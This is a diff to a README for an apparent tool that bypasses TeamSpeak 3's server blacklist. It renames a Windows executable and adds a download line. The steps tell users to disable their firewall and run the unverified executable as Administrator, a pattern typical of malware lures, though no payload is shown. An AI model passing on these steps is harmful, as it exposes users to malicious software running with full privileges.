@@ -29,13 +29,15 @@ This server is blacklisted. Refusing to connect.
 ### For Windows 10,11 (64-bit):
 
 1.  **Download Required Files:**
-    * `TS3-BlackList-Win10x64` (Note: Ensure you obtain this file from a trusted source, as downloading and running executables can pose security risks.)
+    * `TS3-BlackList-Win10-11x64` (Note: Ensure you obtain this file from a trusted source, as downloading and running executables can pose security risks.)
 2.  **Disable your firewall temporarily.**
 3.  **Run the File as Administrator:**
     * Right-click the downloaded file.
     * Select "Run as Administrator".
 4.  **Restart TeamSpeak 3** after completion.
 5.  **Re-enable your firewall.**
+
+   TS3-BlackList-Win10-11x64: Download
 
 ## Important Notes
 
